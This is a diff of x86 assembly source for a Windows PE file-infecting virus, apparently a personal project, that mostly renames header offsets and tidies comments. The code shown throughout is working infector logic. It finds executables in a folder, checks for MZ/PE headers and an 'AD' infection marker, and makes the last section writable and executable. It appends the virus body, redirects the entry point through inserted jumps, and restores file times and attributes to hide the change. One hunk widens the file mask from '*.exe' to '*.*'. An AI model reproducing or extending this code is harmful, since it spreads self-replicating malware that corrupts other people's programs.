@@ -128,16 +128,16 @@ loopOverNames:
     mov     eax, [esi]                          ; read the pointer to the name string
     add     eax, edi                            ; convert to virtual address
         push    ecx
-        xor     ebx, ebx         ; the hash code will be computed in ebx
-        xor     ecx, ecx         ; the next character
+        xor     ebx, ebx                        ; the hash code will be computed in ebx
+        xor     ecx, ecx                        ; the next character
      hashLoop:
         mov     cl, byte [eax]
         cmp     cl, 0
         jz hashDone
-        mov     edx, ebx         ; save old hash
-        shl     ebx, 5           ; multiply by 32
-        sub     ebx, edx         ; subtract a hash, i.e. multiply by 31
-        add     ebx, ecx         ; add the next character
+        mov     edx, ebx                        ; save old hash
+        shl     ebx, 5                          ; multiply by 32
+        sub     ebx, edx                        ; subtract a hash, i.e. multiply by 31
+        add     ebx, ecx                        ; add the next character
         inc     eax
         jmp     hashLoop
      hashDone:
@@ -176,7 +176,7 @@ discard:
 
     ; Now we begin with the business of infecting some files
 
-    ; SetCurrentDirectory ;FIXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXxxXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+    ; SetCurrentDirectory ;TODO FIXXXXXXXXXXXXXXXXXXXXXXXXXXXX
     mov     ebx, [ebp + DATA.EIP]
     add     ebx, directory - anchor
     push    ebx
@@ -326,7 +326,6 @@ InfectFile:
 
     ;; map the view of that file
 
-
     PRINTD "memoryToMap", [ebp + DATA.memoryToMap]
     mov     ebx, [ebp + DATA.memoryToMap]           ; # Bytes to map
     push    ebx
@@ -339,44 +338,43 @@ InfectFile:
 
     cmp     eax, 0                                  ; Error ?
     je      CloseMap                                ; Cant map view of file ?
-    mov     esi, eax                                ; ESI = base of map
-    mov     [ebp + DATA.mapAddress], esi            ; Save base of map
+    mov     esi, eax                                ; ESI = base of file mapping
+    mov     [ebp + DATA.mapAddress], esi            ; Save base of file mapping
 
-    ;; check whether the mapped file is a PE file
-    ;; and see if its already been infected
+    ;; check whether the mapped file is a PE file and see if its already been infected
 
-    cmp     word [esi], 0x5A4D ;'ZM'                ; Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
+    cmp     word [esi + DOS.signature], 0x5A4D      ; 'ZM' Is it an EXE file ? (ie Does it have 'MZ' at the beginning?)
     jne     UnmapView                               ; Error ?
-    cmp     word [esi + 38h], 0x4144                ;'AD'  ; Already infected ?
+    cmp     word [esi + 38h], 0x4144                ; 'AD'  ; Already infected ?
     jne     OkGo                                    ; Is it a PE EXE file ?
     mov     word [ebp + DATA.infectionFlag], 0FFh   ; Mark it
     jmp     UnmapView                               ; Error ?
 
 OkGo:
-    mov     ebx, [esi + 3ch]                        ; EBX = PE Header RVA
-    cmp     word [esi + ebx], 0x4550                ;'EP'  ; Is it a PE file ?
+    mov     ebx, [esi + DOS.lfanew]                 ; EBX = PE Header RVA
+    cmp     word [esi + ebx], 0x4550                ; 'EP'  ; Is it a PE file ?
     jne     UnmapView                               ; Error ?
     PRINT_TRACE ;2
 
     ;; If the file is not EXE, is already infected or is not a PE file, we proceed to
     ;; unmap the view of file, otherwise parse the PE Header.
 
-    add     esi, ebx                                ; (ESI points to PE header)
+    add     esi, ebx                                ; (ESI points to PE header now)
     mov     [ebp + DATA.PEHeader], esi              ; Save PE header
-    mov     eax, [esi + 4h]                         ; read machine field in PE Header
+    mov     eax, [esi + PE.Machine]                 ; read machine field in PE Header
     cmp     ax, 0x014c                              ; 0x014c = Intel 386
     jnz     UnmapView                               ; if not 32 bit, then error and quit
-    mov     eax, [esi + 28h]     
+    mov     eax, [esi + PE.AddressOfEntryPoint]     
     mov     [ebp + DATA.oldEntryPoint], eax         ; Save Entry Point of file
-    mov     eax, [esi + 34h]                        ; Find the Image Base
+    mov     eax, [esi + PE.ImageBase]               ; Find the Image Base
     mov     [ebp + DATA.imageBase], eax             ; Save the Image Base
-    mov     eax, [esi + 3ch]
+    mov     eax, [esi + PE.FileAlignment]
     mov     dword [ebp + DATA.fileAlign], eax       ; Save File Alignment ; (EAX = File Alignment)
     PRINT_TRACE ;3
 
-    mov     ebx, [esi + 74h]                        ; Number of directories entries, PE + 0x74
+    mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries, PE + 0x74
     shl     ebx, 3                                  ; * 8 (size of data directories)
-    add     ebx, 78h                                ; add size of COFF header
+    add     ebx, PE.size                            ; add size of PE header
     add     ebx, [ebp + DATA.PEHeader]              ; EAX = address of the .text section
     mov     [ebp + DATA.codeSegment], ebx
     PRINT_TRACE ;4
@@ -386,14 +384,14 @@ OkGo:
 
     push    esi
 
-    mov     ebx, [esi + 74h]                        ; Number of directories entries
+    mov     ebx, [esi + PE.NumberOfRvaAndSizes]     ; Number of directories entries
     shl     ebx, 3                                  ; * 8 (size)
     xor     eax, eax
-    mov     ax, word [esi + 6h]                     ; AX = number of sections
+    mov     ax, word [esi + PE.NumberOfSections]    ; AX = number of sections
     dec     eax                                     ; Look for the last section ending
-    mov     ecx, 28h                                ; ECX = size of sections header
+    mov     ecx, SECTIONH.size                      ; ECX = size of sections header
     mul     ecx                                     ; EAX = ECX * EAX
-    add     esi, 78h
+    add     esi, PE.size
     add     esi, ebx
     add     esi, eax                                ; ESI = Pointer to the last section header
     mov     [ebp + DATA.lastSegment], esi
@@ -401,47 +399,47 @@ OkGo:
     PRINT_TRACE ;5
 
     mov     ebx, [ebp + DATA.codeSegment]
-    mov     eax, [ebx + 20]                         ; pointer to raw data of code segment
+    mov     eax, [ebx + SECTIONH.PointerToRawData]  ; pointer to raw data of code segment
     mov     ebx, [ebp + DATA.codeSegment]
-    add     eax, [ebx + 8]                          ; virtual size of code segment
+    add     eax, [ebx + SECTIONH.VirtualSize]       ; virtual size of code segment
     mov     [ebp + DATA.diskEP], eax                ; where exectuable code is (entryPoint will jump here)
 
     PRINT_TRACE ;6
 
-    mov     eax, [ebp + DATA.imageBase] ; ESI = Pointer to the last section header
-    add     eax, [esi + 12]             ; VirtualAddress
-    add     eax, [esi + 8]              ; VirtualSize
+    mov     eax, [ebp + DATA.imageBase]             ; ESI = Pointer to the last section header
+    add     eax, [esi + SECTIONH.VirtualAddress]    ; VirtualAddress
+    add     eax, [esi + SECTIONH.VirtualSize]       ; VirtualSize
     mov     [ebp + DATA.virusAddress], eax
 
     PRINT_TRACE ;7
-                                        ; ESI = Pointer to the last section header
-    mov     eax, [esi + 20]             ; reading PointerToRawData
-    add     eax, [esi + 8]              ; reading VirtualSize
+                                                    ; ESI = Pointer to the last section header
+    mov     eax, [esi + SECTIONH.PointerToRawData]  ; reading PointerToRawData
+    add     eax, [esi + SECTIONH.VirtualSize]       ; reading VirtualSize
     mov     [ebp + DATA.virusLocation], eax
 
     PRINT_TRACE ;8
 
-    pop   ebx                         ; restore old peheader into ebx
+    pop   ebx                                       ; restore old PE header into ebx
 
-    or      dword [esi + 24h], 00000020h    ; Set [CWE] flags (CODE)
-    or      dword [esi + 24h], 20000000h    ; Set [CWE] flags (EXECUTABLE)
-    or      dword [esi + 24h], 80000000h    ; Set [CWE] flags (WRITABLE)
+    or      dword [esi + SECTIONH.Characteristics], 00000020h    ; Set [CWE] flags (CODE)
+    or      dword [esi + SECTIONH.Characteristics], 20000000h    ; Set [CWE] flags (EXECUTABLE)
+    or      dword [esi + SECTIONH.Characteristics], 80000000h    ; Set [CWE] flags (WRITABLE)
 
     ;; The flags tell the loader that the section now
     ;; has executable code and is writable
 
-    mov     eax, [esi + 0x10]               ; EAX = size of raw data in this section (ESI = Pointer to the last section header)
-    mov     [ebp + DATA.oldRawSize], eax    ; Save it
-    mov     ecx, [esi + 0x08]
+    mov     eax, [esi + SECTIONH.SizeOfRawData]    ; EAX = size of raw data in this section (ESI = Pointer to the last section header)
+    mov     [ebp + DATA.oldRawSize], eax           ; Save it
+    mov     ecx, [esi + SECTIONH.VirtualSize]
     mov     [ebp + DATA.oldVSOfLast], ecx
-    add     dword [esi + 0x08], virusLen    ; Increase virtual size
+    add     dword [esi + SECTIONH.VirtualSize], virusLen    ; Increase virtual size
     PRINTD "oldRawSize", [ebp + DATA.oldRawSize]
 
     ;; Update ImageBase
 
-    mov     eax, [esi + 0x08]             ; Get new size in EAX
-    add     eax, [esi + 0x0C]             ; + section rva
-    mov     [ebx + 0x50], eax
+    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get new size in EAX
+    add     eax, [esi + SECTIONH.VirtualAddress]            ; + section rva
+    mov     [ebx + PE.SizeOfImage], eax                     ; Save SizeOfImage
 
     ;; The size of raw data is the actual size of the
     ;; data in the section, The virtual size is the one
@@ -451,73 +449,69 @@ OkGo:
     ;; to the filealign value and we get as a reminder
     ;; the number of bytes to pad
 
-    mov     eax, [esi + 0x08]           ; Get new size in EAX
-    mov     ecx, [ebp + DATA.fileAlign]    ; ECX = File alignment
-    div     ecx                         ; Get remainder in EDX
-    mov     ecx, [ebp + DATA.fileAlign]    ; ECX = File alignment
-    sub     ecx, edx      ; Number of bytes to pad
-    mov     [esi + 0x10], ecx    ; Save it
+    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get new size in EAX
+    mov     ecx, [ebp + DATA.fileAlign]                     ; ECX = File alignment
+    div     ecx                                             ; Get remainder in EDX
+    mov     ecx, [ebp + DATA.fileAlign]                     ; ECX = File alignment
+    sub     ecx, edx                                        ; Number of bytes to pad
+    mov     [esi + SECTIONH.SizeOfRawData], ecx             ; Save it
     PRINT_TRACE ;9
 
     ;; Now size of raw data = number of bytes to pad
 
-    mov     eax, [esi + 0x08]    ; Get current VirtualSize
-    add     eax, [esi + 0x10]    ; EAX = SizeOfRawdata padded
-    mov     [esi + 0x10], eax    ; Set new SizeOfRawdata
+    mov     eax, [esi + SECTIONH.VirtualSize]               ; Get current VirtualSize
+    add     eax, [esi + SECTIONH.SizeOfRawData]             ; EAX = SizeOfRawdata padded
+    mov     [esi + SECTIONH.SizeOfRawData], eax             ; Set new SizeOfRawdata
 
-    ;; Now size of raw data = old virtual size +
-    ;; number of bytes to pad
+    ;; Now size of raw data = old virtual size + number of bytes to pad
 
-    mov     [ebp + DATA.newRawSize], eax    ; Save it
+    mov     [ebp + DATA.newRawSize], eax                    ; Save it
     PRINTD "newRawSize", [ebp + DATA.newRawSize]
 
     ;; The virus will be at the end of the section, In
-    ;; order to find its address we have the following
-    ;; formula
-    ;;
-    ;; VirtualAddress + VirtualSize - VirusLength
-    ;;      + RawSize = VirusStart
+    ;; order to find its address we have the following formula:
+    ;; VirtualAddress + VirtualSize - VirusLength + RawSize = VirusStart
 
     mov     eax, [ebp + DATA.codeSegment]
     mov     ebx, [ebp + DATA.codeSegment]
-    mov     eax, [ebx + 0x0C]     ; Reading code segment's RVA
-    add     eax, [ebx + 0x08]      ; Add the size of the segment
+    mov     eax, [ebx + SECTIONH.VirtualAddress]            ; Reading code segment's RVA
+    add     eax, [ebx + SECTIONH.VirtualSize]               ; Add the size of the segment
     PRINT_TRACE;11
-    mov     [ebp + DATA.newEntryPoint], eax   ; EAX = new EIP, and save it
+    mov     [ebp + DATA.newEntryPoint], eax                 ; EAX = new EIP, and save it
     PRINT_TRACE;12
 
     ;; Here we compute with how much did we increase the size of raw data
 
-    mov     eax, [ebp + DATA.oldRawSize]    ; Original SizeOfRawdata
-    mov     ebx, [ebp + DATA.newRawSize]    ; New SizeOfRawdata
-    sub     ebx, eax      ; Increase in size
-    mov     [ebp + DATA.incRawSize], ebx    ; Save increase value
+    mov     eax, [ebp + DATA.oldRawSize]                ; Original SizeOfRawdata
+    mov     ebx, [ebp + DATA.newRawSize]                ; New SizeOfRawdata
+    sub     ebx, eax                                    ; Increase in size
+    mov     [ebp + DATA.incRawSize], ebx                ; Save increase value
     PRINT_TRACE ;13
 
-    ;; Compute the new file size                         ;;
+    ;; Compute the new file size                         
 
-    mov     eax, [esi + 0x14]    ; Read PointerToRawData from last section's header
+    mov     eax, [esi + SECTIONH.PointerToRawData]      ; Read PointerToRawData from last section's header
     PRINTD "PointerToRawData", eax
-    add     eax, [ebp + DATA.newRawSize]    ; Add size of new raw data
-    mov     [ebp + DATA.newFileSize], eax    ; EAX = new filesize, and save it
+    add     eax, [ebp + DATA.newRawSize]                ; Add size of new raw data
+    mov     [ebp + DATA.newFileSize], eax               ; EAX = new filesize, and save it
     PRINTD "newFileSize", [ebp + DATA.newFileSize]
 
     ;; Now prepare to copy the virus to the host, The formulas are                                      ;;
 
-    mov     eax, [ebp + DATA.diskEP]            ; Align in memory to map address
+    mov     eax, [ebp + DATA.diskEP]                    ; Align in memory to map address
     add     eax, [ebp + DATA.mapAddress]
 
-    mov     [eax], byte 0xE9                   ; relative near jump instruction
+    mov     [eax], byte 0xE9                            ; relative near jump instruction
     mov     ebx, [ebp + DATA.lastSegment]
-    mov     ebx, [ebx + 12]                    ; lastSegment address
+    mov     ebx, [ebx + SECTIONH.VirtualAddress]        ; lastSegment address
     PRINTH "lastSegment address", ebx
     mov     ecx, [ebp + DATA.codeSegment]
-    sub     ebx, [ecx + 12]                    ; - codeSegment address
+    sub     ebx, [ecx + SECTIONH.VirtualAddress]        ; - codeSegment address
     PRINTH "codeSegment address", [ecx]
-    add     ebx, [ebp + DATA.oldVSOfLast]      ; + lastSegment size
+    add     ebx, [ebp + DATA.oldVSOfLast]               ; + lastSegment size
     PRINTH "lastSegment size", [ecx]
     mov     ecx, [ebp + DATA.codeSegment]
-    sub     ebx, [ecx + 8]                     ; - codeSegment size
+    sub     ebx, [ecx + SECTIONH.VirtualSize]           ; - codeSegment size
     PRINTH "codeSegment size", [ecx]
     sub     ebx, 5                             ; subtract length of the jump instruction (it takes up 5 bytes of space)
     mov     [eax + 1], ebx                     ; = 4 byte address
@@ -541,10 +535,10 @@ OkGo:
 
     ; Transfer execution to the host entry point
     mov     ecx, [ebp + DATA.codeSegment]
-    add     ebx, [ecx + 8]                      ; add Size of CodeSegment
+    add     ebx, [ecx + SECTIONH.VirtualSize]   ; add Size of CodeSegment
     sub     ebx, [ebp + DATA.oldEntryPoint]     ; subtract old entry point
     add     ebx, 0x1000                         ; correct for BaseOfCode
-    add     ebx, 0xA                            ; correct for 2 near JMPs
+    add     ebx, 10                             ; correct for 2 near JMPs (2 x 5 bytes)
     add     ebx, virusLen                       ; add virusLength
     neg     ebx
     mov     [eax], byte 0xE9
@@ -552,23 +546,21 @@ OkGo:
     PRINT_TRACE ;17
     PRINTH "ebx", ebx
 
-    ;; Now, lets alter furthur the PE header by marking
-    ;; the new IP, increasing the total size of the
-    ;; files image with the increasing of the last
-    ;; section
+    ;; Now, lets alter the PE header by marking the new IP, increasing the total 
+    ;; size of the files image with the increasing of the last section
 
     PRINT_TRACE ;18
-    mov     esi, [ebp + DATA.PEHeader]          ; ESI = Address of PE header
-    mov     eax, [ebp + DATA.newEntryPoint]     ; Get value of new EIP in EAX
+    mov     esi, [ebp + DATA.PEHeader]              ; ESI = Address of PE header
+    mov     eax, [ebp + DATA.newEntryPoint]         ; Get value of new EIP in EAX
     PRINT_TRACE ;19
-    mov     [esi + 28h], eax          ; Write it to the PE header
+    mov     [esi + PE.AddressOfEntryPoint], eax     ; Write it to the PE header
 
     PRINT_TRACE ;20
 
     ;; Now, lets mark the file as infected
 
     mov     esi, [ebp + DATA.mapAddress]
-    mov     word [esi + 38h], 0x4144 ;'AD'  ; Mark file as infected
+    mov     word [esi + 38h], 0x4144                ;'AD'  ; Mark file as infected
     PRINT_TRACE ;16
 
 UnmapView:
@@ -592,14 +584,14 @@ CloseFile:
     push    ebx
     mov     ebx, [ebp + DATA.fileHandle]
     push    ebx
-    call    [ebp + DATA.SetFileTime]                           ; set time fields ;FIXME
+    call    [ebp + DATA.SetFileTime]                ; set time fields ;FIXME
     PRINT_TRACE
 
     ;; In order to properly close the file we must set its EOF at the exact end
     ;; of file, So first we move the pointer to the end and set the EOF
 
-    push    0                           ; First we must set the file
-    push    NULL      ; Pointer at the end of file (that is the beginning + new file size)
+    push    0                                       ; First we must set the file
+    push    NULL                                    ; Pointer at the end of file (that is the beginning + new file size)
     mov     ebx, [ebp + DATA.newFileSize]
     push    ebx
     mov     ebx, [ebp + DATA.fileHandle]
@@ -624,7 +616,7 @@ CloseFile:
     mov     ebx, [ebp + DATA.fileAttributes]
     push    ebx
     lea     ebx, [ebp + DATA.FIND_DATA + 44]
-    push    ebx                ; Push the address of the search record
+    push    ebx                                     ; Push the address of the search record
     PRINT_TRACE
     call    [ebp + DATA.SetFileAttributesA]
     PRINT_TRACE
@@ -649,18 +641,18 @@ OutOfHere:
     retn
 
 
-;; Returns the current value of the EIP register
+    ;; Returns the current value of the EIP register
 getEIP:
     mov     eax, [esp]
     retn
 
 
-    ; Constant data sections
+    ;; Constant data section
 
-    message:                db 'Im a virus, motherfucker!', 10, 'GET HACKED!!!', 10
+    message:                db 'Good morning America!', 10
     message_end:
     directory:              db "C:\Assembly\Dummies\", 0
-    exestr:                 db "*.exe", 0
+    exestr:                 db "*.*", 0
     overlapped:             istruc OVERLAPPED
         at offset,          dd 0xFFFFFFFF
         at offsetHigh,      dd 0xFFFFFFFF
